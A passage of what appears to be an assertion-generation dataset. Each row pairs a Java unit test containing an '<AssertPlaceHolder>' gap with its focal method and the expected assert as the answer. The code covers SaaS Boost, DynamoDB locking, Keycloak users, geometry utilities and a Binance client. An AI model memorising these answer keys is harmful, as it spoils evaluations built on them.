RESOURCES for CUSTOM_RESOURCES in {}"", changedPath); continue; } // now add targets if necessary switch (pathAction) { case RESOURCES: { if (target.endsWith("".yaml"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else if (target.endsWith(""keycloak/Dockerfile"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else { LOGGER.debug(""Skipping adding {} to UpdateAction {}"", target, pathAction); } break; } case CLIENT: case CUSTOM_RESOURCES: case FUNCTIONS: case LAYERS: case METERING_BILLING: case SERVICES: { // each of the above actions use update.sh to update. the target here needs to be // a directory, because the update workflow looks underneath the target for the update // script. therefore editing something like layers/ parent pom or metering-billing // parent pom is not something worth updating LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); // absolute against workingDir, rather than against running dir Path targetPath = Path.of(workingDir.toString(), changedPath.subpath(0, i + 2).toString()); if (targetPath.toFile().isDirectory()) { // a non-yaml file (e.g. pom.xml) is not an acceptable target, // since there will be no update path underneath it pathAction.addTarget(target); } break; } default: { // do nothing } } if (pathAction.getTargets().size() > 0 && !actions.contains(pathAction)) { LOGGER.debug(""Adding new action {} from path {}"", pathAction, changedPath); actions.add(pathAction); } break; } } }  return actions; }"	assertEquals(expectedActions, actualActions)
"testUpdateActionsFromPaths_resourcesCheckstyle() { Set<UpdateAction> expectedActions = EnumSet.noneOf(UpdateAction.class); // this is not a valid update target List<Path> changedPaths = List.of(Path.of(""resources/checkstyle/checkstyle.xml"")); Collection<UpdateAction> actualActions = updateWorkflow.getUpdateActionsFromPaths(changedPaths); ""<AssertPlaceHolder>""; }
getUpdateActionsFromPaths(List<Path> changedPaths) { Set<UpdateAction> actions = EnumSet.noneOf(UpdateAction.class);  /* * Take for example the following list of changed paths: *   client/web/src/App.js *   functions/core-stack-listener/src/... *   services/onboarding-service/src/... *   services/tenant-service/src/... *   services/tenant-service/src/... *   resources/saas-boost.yaml *   resources/saas-boost-svc-tenant.yaml *   resources/custom-resources/app-services-ecr-macro/src/... * * The intention of this algorithm is to pull out the high level SaaS Boost components from the Path, as * represented by the UpdateAction Enum. e.g. CLIENT, FUNCTIONS, SERVICES, CUSTOM_RESOURCES, RESOURCES for * the above example, following these steps *   - for each path *     - traverse through each path component, up to a maximum depth of 2 (optimization, since no component *       pathname is at a depth deeper than two) *       - if we find the resources/ path component and the next component is custom-resources, continue *       - otherwise match the path component against an UpdateAction. if we find a valid one, add it to our *         list taking into account not only the UpdateAction itself (e.g. FUNCTIONS) but also the ""target"" *         of the UpdateAction (e.g. FUNCTIONS -> core-stack-listener) * * So the expected set of UpdateActions resulting from the above example is: *   CLIENT *   FUNCTIONS -> core-stack-listener *   SERVICES -> onboarding-service, tenant-service *   RESOURCES -> saas-boost.yaml, saas-boost-svc-tenant.yaml *   CUSTOM_RESOURCES -> app-services-ecr-macro */ for (Path changedPath : changedPaths) { LOGGER.debug(""processing {}"", changedPath); Path absolutePath = Path.of(workingDir.toString(), changedPath.toString()); if (!absolutePath.toFile().exists()) { LOGGER.debug(""Skipping {} since it doesn't exist"", changedPath); continue; } final int maximumTraversalDepth = 2; for (int i = 0; i < Math.min(changedPath.getNameCount(), maximumTraversalDepth); i++) { UpdateAction pathAction = UpdateAction.fromDirectoryName(changedPath.getName(i).toString()); if (pathAction != null) { // edge case: if this is a resources/custom-resources/.. path, we might be pinging on resources/ //            when we should on custom-resources. so skip if it is LOGGER.debug(""found action {} from path {}"", pathAction, changedPath); if ((i + 1) == changedPath.getNameCount()) { // ""this"" name at `i` resolved to an UpdateAction, but there is no valid target // represented by the next value in the name. this is an invalid changed path: // a directory itself isn't changed, the files underneath is changed LOGGER.error(""Skipping {}, since it's an invalid changed path: expecting a file"", changedPath); break; } String target = changedPath.getName(i + 1).toString(); if (pathAction == UpdateAction.RESOURCES && UpdateAction.fromDirectoryName(target) == UpdateAction.CUSTOM_RESOURCES) { LOGGER.debug(""Skipping RESOURCES for CUSTOM_RESOURCES in {}"", changedPath); continue; } // now add targets if necessary switch (pathAction) { case RESOURCES: { if (target.endsWith("".yaml"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else if (target.endsWith(""keycloak/Dockerfile"")) { LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); pathAction.addTarget(target); } else { LOGGER.debug(""Skipping adding {} to UpdateAction {}"", target, pathAction); } break; } case CLIENT: case CUSTOM_RESOURCES: case FUNCTIONS: case LAYERS: case METERING_BILLING: case SERVICES: { // each of the above actions use update.sh to update. the target here needs to be // a directory, because the update workflow looks underneath the target for the update // script. therefore editing something like layers/ parent pom or metering-billing // parent pom is not something worth updating LOGGER.debug(""Adding new target {} to UpdateAction {}"", target, pathAction); // absolute against workingDir, rather than against running dir Path targetPath = Path.of(workingDir.toString(), changedPath.subpath(0, i + 2).toString()); if (targetPath.toFile().isDirectory()) { // a non-yaml file (e.g. pom.xml) is not an acceptable target, // since there will be no update path underneath it pathAction.addTarget(target); } break; } default: { // do nothing } } if (pathAction.getTargets().size() > 0 && !actions.contains(pathAction)) { LOGGER.debug(""Adding new action {} from path {}"", pathAction, changedPath); actions.add(pathAction); } break; } } }  return actions; }"	assertEquals(expectedActions, actualActions)
"tryLockUnlock_conditionNotMet() { final AttributeValue onboardingId = AttributeValue.builder().s(ONBOARDING_ID).build(); doReturn(ScanResponse.builder().items(List.of(Map.of(""id"", onboardingId))).build()) .when(mockDdb).scan(any(ScanRequest.class));  doThrow(ConditionalCheckFailedException.builder().build()).when(mockDdb).updateItem(any(UpdateItemRequest.class));  boolean success = testLock.tryLockUnlock(TEST_CONTEXT, true); ""<AssertPlaceHolder>""; }
tryLockUnlock(RequestContext requestContext, boolean tryLock) { try { UpdateItemRequest updateItemRequest = UpdateItemRequest.builder() .tableName(requestContext.onboardingDdbTable) .key(Map.of(""id"", currentOnboardingId(requestContext))) .conditionExpression(""ecs_cluster_locked = :lock_expected"") .updateExpression(""SET ecs_cluster_locked = :new_lock"") .expressionAttributeValues(Map.of( "":lock_expected"", AttributeValue.builder().bool(!tryLock).build(), "":new_lock"", AttributeValue.builder().bool(tryLock).build())) .build(); LOGGER.debug(""trying to {} with updateItemRequest {}"", tryLock ? ""lock"" : ""unlock"", updateItemRequest); ddb.updateItem(UpdateItemRequest.builder() .tableName(requestContext.onboardingDdbTable) .key(Map.of(""id"", currentOnboardingId(requestContext))) .conditionExpression(""ecs_cluster_locked = :lock_expected"") .updateExpression(""SET ecs_cluster_locked = :new_lock"") .expressionAttributeValues(Map.of( "":lock_expected"", AttributeValue.builder().bool(!tryLock).build(), "":new_lock"", AttributeValue.builder().bool(tryLock).build())) .build()); } catch (ConditionalCheckFailedException ccfe) { LOGGER.error(""Could not {} ecs_cluster_locked, conditional check failed: {}"", tryLock ? ""lock"" : ""unlock"", ccfe.getMessage()); return false; } catch (DynamoDbException ddbe) { LOGGER.error(""Error trying to update lock for current onboarding id: {}"", ddbe.getMessage()); LOGGER.error(Utils.getFullStackTrace(ddbe)); throw new RuntimeException(ddbe); } return true; }"	assertFalse(success)
"basic() { ""<AssertPlaceHolder>""; }
builder() { return new Builder(); }"	"assertEquals(new S3Storage(S3Storage.builder()), Utils.fromJson(""{}"", S3Storage.class))"
"enableUserTest() { final String username = ""user""; UserRepresentation existingUser = mockKeycloakUser(username); existingUser.setEnabled(false); doReturn(existingUser).when(mockApi).getUser(any(Map.class), any(String.class)); doReturn(null).when(mockApi).putUser(any(Map.class), userCaptor.capture()); dal.enableUser(Map.of(), username); ""<AssertPlaceHolder>""; }
enableUser(Map<String, Object> event, String username) { return enableDisable(event, username, true); }"	"assertTrue(""User should be active"", userCaptor.getValue().isEnabled())"
"disableUserTest() { final String username = ""user""; UserRepresentation existingUser = mockKeycloakUser(username); existingUser.setEnabled(true); doReturn(existingUser).when(mockApi).getUser(any(Map.class), any(String.class)); doReturn(null).when(mockApi).putUser(any(Map.class), userCaptor.capture()); dal.disableUser(Map.of(), username); ""<AssertPlaceHolder>""; }
disableUser(Map<String, Object> event, String username) { return enableDisable(event, username, false); }"	"assertFalse(""User should not be active"", userCaptor.getValue().isEnabled())"
"id_fromTier() { ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(VALID_ATTRIBUTES.get(DynamoTierAttribute.id.name()), DynamoTierAttribute.id.fromTier(VALID_TIER))
"id_fromTier_null() { Tier nullIdTier = Tier.builder(VALID_TIER).id(null).build(); AttributeValue nullIdAttributeValue = AttributeValue.builder().s(null).build(); ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(nullIdAttributeValue, DynamoTierAttribute.id.fromTier(nullIdTier))
"id_fromTier_empty() { Tier emptyIdTier = Tier.builder(VALID_TIER).id("""").build(); AttributeValue emptyIdAttributeValue = AttributeValue.builder().s("""").build(); ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(emptyIdAttributeValue, DynamoTierAttribute.id.fromTier(emptyIdTier))
"created_fromTier() { ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(VALID_ATTRIBUTES.get(DynamoTierAttribute.created.name()), DynamoTierAttribute.created.fromTier(VALID_TIER))
"created_fromTier_null() { Tier nullCreatedTier = Tier.builder(VALID_TIER).created(null).build(); AttributeValue nullCreatedAttributeValue = AttributeValue.builder().s(null).build(); ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(nullCreatedAttributeValue, DynamoTierAttribute.created.fromTier(nullCreatedTier))
"modified_fromTier() { ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(VALID_ATTRIBUTES.get(DynamoTierAttribute.modified.name()), DynamoTierAttribute.modified.fromTier(VALID_TIER))
"modified_fromTier_null() { Tier nullModifiedTier = Tier.builder(VALID_TIER).modified(null).build(); AttributeValue nullModifiedAttributeValue = AttributeValue.builder().s(null).build(); ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(nullModifiedAttributeValue, DynamoTierAttribute.modified.fromTier(nullModifiedTier))
"name_fromTier() { ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(VALID_ATTRIBUTES.get(DynamoTierAttribute.name.name()), DynamoTierAttribute.name.fromTier(VALID_TIER))
"description_fromTier() { ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(VALID_ATTRIBUTES.get(DynamoTierAttribute.description.name()), DynamoTierAttribute.description.fromTier(VALID_TIER))
"description_fromTier_null() { Tier nullDescriptionTier = Tier.builder(VALID_TIER).description(null).build(); AttributeValue nullDescriptionAttributeValue = AttributeValue.builder().s(null).build(); ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(nullDescriptionAttributeValue, DynamoTierAttribute.description.fromTier(nullDescriptionTier))
"description_fromTier_empty() { Tier emptyDescriptionTier = Tier.builder(VALID_TIER).description("""").build(); AttributeValue emptyDescriptionAttributeValue = AttributeValue.builder().s("""").build(); ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(emptyDescriptionAttributeValue, DynamoTierAttribute.description.fromTier(emptyDescriptionTier))
"defaultTier_fromTier() { ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(VALID_ATTRIBUTES.get(DynamoTierAttribute.default_tier.name()), DynamoTierAttribute.default_tier.fromTier(VALID_TIER))
"defaultTier_fromTier_null() { Tier nullDefaultTier = Tier.builder(VALID_TIER).defaultTier(null).build(); AttributeValue nullDefaultAttributeValue = AttributeValue.builder().s(null).build(); ""<AssertPlaceHolder>""; }
fromTier(Tier tier) { // if Tier.created or Tier.modified is null, this might throw a NullPointer return fromTierFunction.apply(tier); }"	assertEquals(nullDefaultAttributeValue, DynamoTierAttribute.default_tier.fromTier(nullDefaultTier))
"setAndGet() { HSLColor hslColor = new HSLColor(hslcolor1[0], hslcolor1[1], hslcolor1[2], hslcolor1[3]); hslColor.set(HSLColor.LUMINANCE, 80); Assert.""<AssertPlaceHolder>""; }
get(int component) { if (component == ALPHA) return alpha; return components[component]; }"	assertEquals(80, hslColor.get(HSLColor.LUMINANCE), delta(80))
"radian() { for (int i = 0; i <= 360; i++) { Assert.""<AssertPlaceHolder>""; } }
radian(float degree) { return (float) Math.toRadians(degree); }"	assertEquals(Math.toRadians(i), MathUtils.radian(i), smallDelta)
"round() { for (int i = 0; i < 100; i++) { float random = MathUtils.random(0, 100); Assert.""<AssertPlaceHolder>""; } }
round(float x) { return Math.round(x); }"	assertEquals(Math.round(random), MathUtils.round(random), minimalDelta)
"convexHull() { for (int test = 0; test < 10; test++) { Vector2f[] vectors = new Vector2f[(int) (Math.random() * 50 + 4)]; for (int i = 0; i < vectors.length; i++) { vectors[i] = new Vector2f((float) (Math.random() * -1000 + 500), (float) (Math.random() * -1000 + 500)); } ConvexPolygon polygon = new ConvexPolygon(vectors); polygon.setPosition(0, 0); // all non-edge points shall be inside the polygon for (Vector2f vec : Arrays.stream(vectors).filter(v -> !Arrays.asList(polygon.getAbsolutePoints()).contains(v)).collect(Collectors.toList())) { Point point = new Point(vec); point.setPosition(0, 0); Assert.""<AssertPlaceHolder>""; } } }
gjksmCollision(PrimitiveShape shapeA, PrimitiveShape shapeB) { Vector2f startPoint = maxDotPointMinkDiff(shapeA, shapeB, shapeA.centroid().mul(-1, new Vector2f())); Vector2f direction = new Vector2f(-startPoint.x, -startPoint.y);  //will contain the triangle containing the origin Triple<Vector2f, Vector2f, Vector2f> simplex = new Triple<>();  simplex.setLeft(startPoint);  int pointsConfirmed = 1; int loop = 0; int maxLoop = shapeA.vertices() + shapeB.vertices(); if (shapeA.type() == ShapeType.CIRCLE || shapeB.type() == ShapeType.CIRCLE) maxLoop += 20;  while (pointsConfirmed < 3) {  loop++; //loop at max 20 times plus the amount of both shapes faces, so that there is enough room to find collision. //this is obviously not a good solution, but it should do fine for now. if (loop > maxLoop) return new CollisionInformation(null, false);  //the point furthest in the direction //Shape combinedShape = minkDiff(shapeA, shapeB); combinedShape.supportPoint(direction); Vector2f pointA = maxDotPointMinkDiff(shapeA, shapeB, direction);  if (pointA.dot(direction) < 0) return new CollisionInformation(null, false); //no intersection  //do Simplex -> two points needed for that { //vector AB Vector2f ab = startPoint.sub(pointA, new Vector2f()); //aToB(pointA, startPoint); //vector towards the origin of A Vector2f ao = new Vector2f(-pointA.x, -pointA.y);  //the origin is between a and b considering perpendicular lines of ab through a and b if (rightDirection(ab, ao)) {  //one of the perpendicular vectors Vector2f perpendicular = new Vector2f(ab).perpendicular();  //decide if negating is necessary - it should point towards AO, therefore dot product has to be > 0 if (!rightDirection(perpendicular, ao)) perpendicular.mul(-1);  direction.set(perpendicular);  //points.add(ao); if (pointsConfirmed == 1) simplex.setMiddle(pointA); else if (pointsConfirmed == 2) simplex.setRight(pointA);  //triangular check not necessary //if the next point derived from the perpendicular direction can find a point //where the new point is enclosing the origin, we got it pointsConfirmed++;  } else {  //should only happen to search the startpoint, //any second point should be cancelled out startPoint = pointA; direction.set(ao); simplex.setLeft(pointA);  pointsConfirmed = 1;  } } }  //3 points are confirmed, there is intersection Vector2f[] vector2fs = Arrays.asList(simplex.getLeft(), simplex.getMiddle(), simplex.getRight()).toArray(new Vector2f[0]); return new CollisionInformation(vector2fs, true);  }"	assertTrue(MathUtils.gjksmCollision(point, polygon).collision())
"testList() { OrderPreservingList<Integer> list = new OrderPreservingList<>(); for (int value : data) { list.add(value); Assert.""<AssertPlaceHolder>""; } }
add(T t) { int indexToAdd = findIndexToAdd(t); super.add(indexToAdd, t); return true; }"	assertTrue(isSorted(list))
"nonNull() { String object = ""Any String, test""; Assert.""<AssertPlaceHolder>""; }
nonNull(T obj) { if (obj == null) throw new NullPointerException(""a non-null object is null""); return obj; }"	assertEquals(object, Preconditions.nonNull(object))
"isNull2() { String name = ""obj""; try { Preconditions.nonNull(name, null); } catch (NullPointerException e) { Assert.""<AssertPlaceHolder>""; } }
nonNull(String name, T obj) { if (obj == null) throw new NullPointerException(name + "" is null""); return obj; }"	"assertEquals(name + "" is null"", e.getMessage())"
"salvarTest() { IClienteDao mockDao = new ClienteDaoMock(); ClienteService service = new ClienteService(mockDao); String retorno = service.salvar(); Assert.""<AssertPlaceHolder>""; }
salvar() { clienteDao.salvar(); return ""Sucesso""; }"	"assertEquals(""Sucesso"", retorno)"
"esperadoErroNoSalvarTest() { IClienteDao mockDao = new ClienteDao(); ClienteService service = new ClienteService(mockDao); String retorno = service.salvar(); Assert.""<AssertPlaceHolder>""; }
salvar() { clienteDao.salvar(); return ""Sucesso""; }"	"assertEquals(""Sucesso"", retorno)"
"salvarTest() { IContratoDao dao = new ContratoDaoMock(); IContratoService service = new ContratoService(dao); String retorno = service.salvar(); Assert.""<AssertPlaceHolder>""; }
salvar() { contratoDao.salvar(); return ""Sucesso""; }"	"assertEquals(""Sucesso"", retorno)"
"esperadoErroNoSalvarComBancoDeDadosTest() { IContratoDao dao = new ContratoDao(); IContratoService service = new ContratoService(dao); String retorno = service.salvar(); Assert.""<AssertPlaceHolder>""; }
salvar() { contratoDao.salvar(); return ""Sucesso""; }"	"assertEquals(""Sucesso"", retorno)"
"pesquisarCliente() { Cliente clienteConsultado = clienteDao.consultar(cliente.getCpf()); Assert.""<AssertPlaceHolder>""; }
consultar(String codigo) throws Exception { Connection connection = null; PreparedStatement stm = null; ResultSet rs = null; Cliente cliente = null; try { connection = ConnectionFactory.getConnection(); String sql = ""select * from tb_cliente_2 where codigo = ?""; stm = connection.prepareStatement(sql); stm.setString(1, codigo); rs = stm.executeQuery(); if (rs.next()) { cliente = new Cliente(); cliente.setId(rs.getLong(""id"")); cliente.setCodigo(rs.getString(""codigo"")); cliente.setNome(rs.getString(""nome"")); } return cliente; } catch(Exception e) { throw e; } finally { if (stm != null && !stm.isClosed()) { stm.close(); } if (connection != null && !connection.isClosed()) { connection.close(); } } }"	assertNotNull(clienteConsultado)
"TipoChaveNaoEncontradaException { cliente.setNome(""Rodrigo Pires""); clienteDao.alterar(cliente); Assert.""<AssertPlaceHolder>""; }
alterar(Cliente cliente) { EntityManagerFactory entityManagerFactory = Persistence.createEntityManagerFactory(""ExemploJPA""); EntityManager entityManager = entityManagerFactory.createEntityManager();  entityManager.getTransaction().begin(); cliente = entityManager.merge(cliente); entityManager.getTransaction().commit();  entityManager.close(); entityManagerFactory.close(); return cliente; }"	"assertEquals(""Rodrigo Pires"", cliente.getNome())"
"Exception { DeleteCallForwarding proc = new DeleteCallForwarding(); ""<AssertPlaceHolder>""; }
getProcedureName() { return (this.procName); }"	assertEquals(DeleteCallForwarding.class.getSimpleName(), proc.getProcedureName())
"Exception { // { latitude, longitude } double[][] locations = { {39.175278, -76.668333}, // Baltimore-Washington, USA (BWI) {-22.808889, -43.243611}, // Rio de Janeiro, Brazil (GIG) {40.633333, -73.783333}, // New York, USA (JFK) {-33.946111, 151.177222}, // Syndey, Austrailia (SYD) }; // expected distance in miles double[] expected = { 4796, // BWI->GIG 183, // BWI->JFK 9787, // BWI->SYD 4802, // GIG->JFK 8402, // GIG->SYD 9950, // JFK->SYD };  int e = 0; for (int i = 0; i < locations.length - 1; i++) { double[] loc0 = locations[i]; for (int j = i + 1; j < locations.length; j++) { double[] loc1 = locations[j]; double distance = Math.round(DistanceUtil.distance(loc0[0], loc0[1], loc1[0], loc1[1])); ""<AssertPlaceHolder>""; } // FOR } // FOR }
distance(double lat0, double lon0, double lat1, double lon1) { double theta = lon0 - lon1; double dist = Math.sin(deg2rad(lat0)) * Math.sin(deg2rad(lat1)) + Math.cos(deg2rad(lat0)) * Math.cos(deg2rad(lat1)) * Math.cos(deg2rad(theta)); dist = Math.acos(dist); dist = rad2deg(dist); return (dist * 60 * 1.1515); }"	assertEquals(expected[e++], distance, 0.0001f)
"Exception { Class<?>[] targets = { MockObject1.class, MockObject2.class, }; Class<?>[] params = {MockObject1.class};  for (Class<?> targetClass : targets) { Constructor<?> c = ClassUtil.getConstructor(targetClass, params); ""<AssertPlaceHolder>""; } // FOR }
getConstructor(Class<T> target_class, Class<?>... params) { NoSuchMethodException error = null; try { return (target_class.getConstructor(params)); } catch (NoSuchMethodException ex) { // The first time we get this it can be ignored // We'll try to be nice and find a match for them error = ex; }  if (LOG.isDebugEnabled()) { LOG.debug(""TARGET CLASS:  {}"", target_class); LOG.debug(""TARGET PARAMS: {}"", Arrays.toString(params)); }  @SuppressWarnings(""rawtypes"") List<Class<?>>[] paramSuper = (List<Class<?>>[]) new List[params.length]; for (int i = 0; i < params.length; i++) { paramSuper[i] = ClassUtil.getSuperClasses(params[i]); if (LOG.isDebugEnabled()) { LOG.debug(""  SUPER[{}] => {}"", params[i].getSimpleName(), paramSuper[i]); } }  for (Constructor<?> c : target_class.getConstructors()) { Class<?>[] cTypes = c.getParameterTypes(); if (LOG.isDebugEnabled()) { LOG.debug(""CANDIDATE: {}"", c); LOG.debug(""CANDIDATE PARAMS: {}"", Arrays.toString(cTypes)); } if (params.length != cTypes.length) { continue; }  for (int i = 0; i < params.length; i++) { List<Class<?>> cSuper = ClassUtil.getSuperClasses(cTypes[i]); if (LOG.isDebugEnabled()) { LOG.debug(""  SUPER[{}] => {}"", cTypes[i].getSimpleName(), cSuper); } if (!CollectionUtils.intersection(paramSuper[i], cSuper).isEmpty()) { return ((Constructor<T>) c); } } } throw new RuntimeException( ""Failed to retrieve constructor for "" + target_class.getSimpleName(), error); }"	assertNotNull(c)
"testIterableEnumeration() { final int size = 10; Enumeration<Integer> e = new Enumeration<Integer>() { int ctr = 0;  @Override public Integer nextElement() { return (ctr++); }  @Override public boolean hasMoreElements() { return (ctr < size); } };  List<Integer> found = new ArrayList<Integer>(); for (Integer i : CollectionUtil.iterable(e.asIterator())) found.add(i); ""<AssertPlaceHolder>""; }
iterable(final Iterator<T> it) { return (new Iterable<T>() { @Override public Iterator<T> iterator() { return (it); } }); }"	assertEquals(size, found.size())
"testGetGreatest() { Map<String, Integer> map = new HashMap<String, Integer>(); map.put(""a"", 1); map.put(""b"", 2); map.put(""c"", 4); map.put(""d"", 3); String key = CollectionUtil.getGreatest(map); ""<AssertPlaceHolder>""; }
getGreatest(Map<T, U> map) { T max_key = null; U max_value = null; for (Map.Entry<T, U> e : map.entrySet()) { T key = e.getKey(); U value = e.getValue(); if (max_value == null || value.compareTo(max_value) > 0) { max_value = value; max_key = key; } } // FOR return (max_key); }"	"assertEquals(""c"", key)"
"testGetFirst() { List<String> list = new ArrayList<String>(); list.add(""a""); list.add(""b""); list.add(""c""); String key = CollectionUtil.first(list); ""<AssertPlaceHolder>""; }
first(Iterable<T> items) { return (CollectionUtil.get(items, 0)); }"	"assertEquals(""a"", key)"
"Exception { double sigma = 1.0000001d;  int round = num_rounds; while (round-- > 0) { RandomDistribution.Zipf zipf = new RandomDistribution.Zipf(this.rand, min, max, sigma); Histogram<Integer> hist = new Histogram<Integer>(); // System.out.println(""Round #"" + Math.abs(num_rounds - 10) + "" [sigma="" + sigma + ""]""); for (int i = 0; i < num_records; i++) { int value = zipf.nextInt(); hist.put(value); } // FOR Long last = null; for (Integer value : hist.values()) { long current = hist.get(value); if (last != null) { // ""<AssertPlaceHolder>""; } last = current; } //            System.out.println(hist); //            System.out.println(""----------------------------------------------""); sigma += 0.5d; } // FOR }
nextInt() { long val = (int) this.nextLongImpl(); if (this.history != null) { this.history.put(val); } return ((int) val); }"	assertTrue(last >= current)
"Exception { Histogram<Integer> hist = new Histogram<Integer>(); RandomDistribution.Zipf zipf = new RandomDistribution.Zipf(this.rand, min, max, 1.0000001d); for (int i = 0; i < num_records; i++) { hist.put(zipf.nextInt()); } // FOR  RandomDistribution.FlatHistogram<Integer> flat = new RandomDistribution.FlatHistogram<Integer>(this.rand, hist); Histogram<Integer> hist2 = new Histogram<Integer>(); for (int i = 0; i < num_records; i++) { hist2.put(flat.nextInt()); } // FOR ""<AssertPlaceHolder>""; }
nextInt() { long val = (int) this.nextLongImpl(); if (this.history != null) { this.history.put(val); } return ((int) val); }"	assertEquals(hist.getMaxCountValues(), hist2.getMaxCountValues())
"Exception { Histogram<Long> hist = new Histogram<Long>(); RandomDistribution.Zipf zipf = new RandomDistribution.Zipf(this.rand, min, max, 1.0000001d); for (int i = 0; i < num_records; i++) { hist.put(zipf.nextLong()); } // FOR  RandomDistribution.FlatHistogram<Long> flat = new RandomDistribution.FlatHistogram<Long>(this.rand, hist); Histogram<Long> hist2 = new Histogram<Long>(); for (int i = 0; i < num_records; i++) { hist2.put(flat.nextLong()); } // FOR ""<AssertPlaceHolder>""; }
nextLong() { long val = this.nextLongImpl(); if (this.history != null) { this.history.put(val); } return (val); }"	assertEquals(hist.getMaxCountValues(), hist2.getMaxCountValues())
"Exception { // 创建测试数据 List<Long> testData = new ArrayList<>(); testData.add(1L); testData.add(2L);  // 设置 StreamExecutionEnvironment StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment(); env.setParallelism(1);  // 创建数据源 DataStreamSource<Long> testDataStream = env.fromCollection(testData);  // 应用 MapFunction SingleOutputStreamOperator<Long> map = testDataStream.map(new MapFunction<Long, Long>() { @Override public Long map(Long value) throws Exception { return value + 1L; } });  // 添加自定义的测试 Sink map.addSink(new TestSink()).setParallelism(1);  // 执行测试 env.execute();  // 验证结果 List<Long> expectedOutput = new ArrayList<>(); expectedOutput.add(2L); expectedOutput.add(3L);  ""<AssertPlaceHolder>""; }
map(Long value) throws Exception { return value + 1L; }"	assertEquals(expectedOutput, TestSink.OUTPUT)
"testLoadSuccess() { String content = ""k1=v1\nk2=v2""; Properties props = PropertiesUtil.load(content); ""<AssertPlaceHolder>""; }
load(String content) { if (content == null) { throw new IllegalArgumentException(""content is null""); }  try (InputStream input = new ByteArrayInputStream(content.getBytes())) { Properties props = new Properties(); props.load(input); return props;  } catch (IOException e) { LOG.error("" load properties failed {}"", e.getMessage()); throw new RuntimeException(""load properties failed"", e); } }"	"assertEquals(""v1"", props.get(""k1""))"
"testWebSocketUrl() { Request request = RequestBuilder.buildWebSocketRequest(fullUrl); ""<AssertPlaceHolder>""; }
buildWebSocketRequest(String fullUrl) { return new Request.Builder().url(fullUrl).build(); }"	assertEquals(request.url().toString(), fullUrl)
"testHandleResponse() { mockWebServer.enqueue(new MockResponse() .addHeader(""Content-Type"", ""application/json; charset=utf-8"") .setResponseCode(MockData.HTTP_STATUS_OK) .setBody(VALID_RESPONSE));  String result = ResponseHandler.handleResponse(request, false, null); ""<AssertPlaceHolder>""; }
handleResponse(Request request, boolean showLimitUsage, ProxyAuth proxy) { client = HttpClientSingleton.getHttpClient(proxy); try (Response response = client.newCall(request).execute()) { if (null == response) { throw new BinanceServerException(""[ResponseHandler] No response from server""); }  String responseAsString = getResponseBodyAsString(response.body());  if (response.code() >= HTTP_STATUS_CODE_400 && response.code() <= HTTP_STATUS_CODE_499) { throw handleErrorResponse(responseAsString, response.code()); } else if (response.code() >= HTTP_STATUS_CODE_500) { throw new BinanceServerException(responseAsString, response.code()); }  if (showLimitUsage) { return getLimitUsage(response, responseAsString); } else { return responseAsString; } } catch (IOException | IllegalStateException e) { String exceptionMsg = ""OKHTTP Error: ""; if (proxy != null) { if ((e.getClass().equals(ConnectException.class))) { exceptionMsg = ""Proxy Connection Error: ""; } else if ((e.getClass().equals(UnknownHostException.class))) { exceptionMsg = ""Proxy Unknown Host Error: ""; } } throw new BinanceConnectorException(""[ResponseHandler] "" + exceptionMsg + e.getMessage()); } }"	assertEquals(VALID_RESPONSE, result)
"testBuildFullUrl() { String fullUrl = ""www.test.com/url/path?key1=value1&key2=2&key3=0.0006""; ""<AssertPlaceHolder>""; }
buildFullUrl(String baseUrl, String urlPath, Map<String, Object> parameters) { StringBuilder sb = new StringBuilder(baseUrl).append(urlPath); if (parameters != null && !parameters.isEmpty()) { sb.append(""?""); sb.append(joinQueryParameters(parameters)); } return sb.toString(); }"	assertEquals(fullUrl, UrlBuilder.buildFullUrl(baseUrl, urlPath, mockParameters))
"testBuildFullUrlWithoutParams() { ""<AssertPlaceHolder>""; }
buildFullUrl(String baseUrl, String urlPath, Map<String, Object> parameters) { StringBuilder sb = new StringBuilder(baseUrl).append(urlPath); if (parameters != null && !parameters.isEmpty()) { sb.append(""?""); sb.append(joinQueryParameters(parameters)); } return sb.toString(); }"	assertEquals(baseUrl + urlPath, UrlBuilder.buildFullUrl(baseUrl, urlPath, null))
"testJoinQueryParameters() { String joinedQuery = ""key1=value1&key2=2&key3=0.0006""; ""<AssertPlaceHolder>""; }
joinQueryParameters(Map<String, Object> params) { return joinQueryParameters(new StringBuilder(), params).toString(); }"	assertEquals(joinedQuery, UrlBuilder.joinQueryParameters(mockParameters))
